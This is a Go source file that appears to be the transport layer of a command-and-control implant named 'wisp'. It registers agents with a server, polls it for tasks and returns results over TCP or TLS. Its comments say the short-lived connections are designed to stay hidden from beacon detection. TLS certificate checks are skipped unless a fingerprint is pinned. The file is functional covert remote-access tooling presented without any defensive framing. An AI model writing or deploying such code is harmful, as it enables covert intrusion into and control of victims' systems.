package transport

import (
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"time"

	"github.com/user/wisp/shared/protocol"
)

// ErrReauth is returned by Checkin when the server no longer recognises the
// session (e.g. after a server restart). The agent should re-register.
var ErrReauth = errors.New("reauth required")

// fetchServerKey requests the RSA public key from the server. Used when the
// binary has no compiled-in key (CLI/dev mode). Uses a throwaway connection.
func (t *TCPTransport) fetchServerKey() error {
	conn, err := t.dial()
	if err != nil {
		return err
	}
	defer conn.Close()
	key, err := fetchKeyOnConn(conn)
	if err != nil {
		return err
	}
	t.RSAPubPEM = key
	return nil
}

// Transport is the interface implemented by all agent communication channels
// (TCP, KCP and HTTP polling). Register performs the key-exchange handshake and
// Checkin polls for tasks while optionally delivering results.
type Transport interface {
	Register(regData []byte) error
	Checkin(results []byte) ([]byte, error)
}

// TCPTransport manages TCP communication with the server.
//
// It uses short-lived connections: every register/checkin dials a fresh
// connection (with a fresh ephemeral source port) and closes it afterwards.
// This keeps the traffic pattern dispersed (no fixed 4-tuple) and is the
// key to staying hidden — a persistent TCP socket with periodic beacons is
// trivially detectable.
type TCPTransport struct {
	Host      string
	Port      int
	UseTLS    bool
	AgentID   string
	Keys      *protocol.SessionKeys
	RSAPubPEM string

	// Fingerprint optionally pins the server TLS certificate (hex SHA-256).
	// When set, connections with a mismatching certificate are rejected.
	Fingerprint string

	seq uint64 // monotonic checkin counter (replay protection)
}

// Register performs the initial agent registration with the server. The
// connection is closed once the handshake completes.
func (t *TCPTransport) Register(regData []byte) error {
	// Agents launched without a compiled-in key (CLI mode) fetch it first.
	if t.RSAPubPEM == "" {
		if err := t.fetchServerKey(); err != nil {
			return fmt.Errorf("fetch server key: %w", err)
		}
	}

	conn, err := t.dial()
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()

	keys, err := registerOnConn(conn, t.RSAPubPEM, regData)
	if err != nil {
		return err
	}
	t.Keys = keys
	return nil
}

// Checkin sends a heartbeat and retrieves pending tasks over a fresh short-lived
// connection. Any failure maps to ErrReauth so the caller re-registers (a
// session the server no longer knows, or a dead endpoint, both require one).
func (t *TCPTransport) Checkin(results []byte) ([]byte, error) {
	conn, err := t.dial()
	if err != nil {
		return nil, ErrReauth
	}
	defer conn.Close()

	data, err := checkinOnConn(conn, t.AgentID, &t.seq, t.Keys, results)
	if err != nil {
		return nil, ErrReauth
	}
	return data, nil
}

func (t *TCPTransport) dial() (net.Conn, error) {
	addr := net.JoinHostPort(t.Host, fmt.Sprintf("%d", t.Port))
	if t.UseTLS {
		cfg := &tls.Config{InsecureSkipVerify: true}
		if t.Fingerprint != "" {
			cfg.VerifyPeerCertificate = fingerprintVerifier(t.Fingerprint)
		}
		return tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", addr, cfg)
	}
	return net.DialTimeout("tcp", addr, 10*time.Second)
}

// fingerprintVerifier returns a tls.Config.VerifyPeerCertificate callback that
// pins the server certificate to the expected SHA-256 fingerprint (hex).
func fingerprintVerifier(expected string) func([][]byte, [][]*x509.Certificate) error {
	return func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
		if len(rawCerts) == 0 {
			return fmt.Errorf("no server certificate presented")
		}
		sum := sha256.Sum256(rawCerts[0])
		got := hex.EncodeToString(sum[:])
		if got != expected {
			return fmt.Errorf("server certificate fingerprint mismatch: got %s want %s", got, expected)
		}
		return nil
	}
}
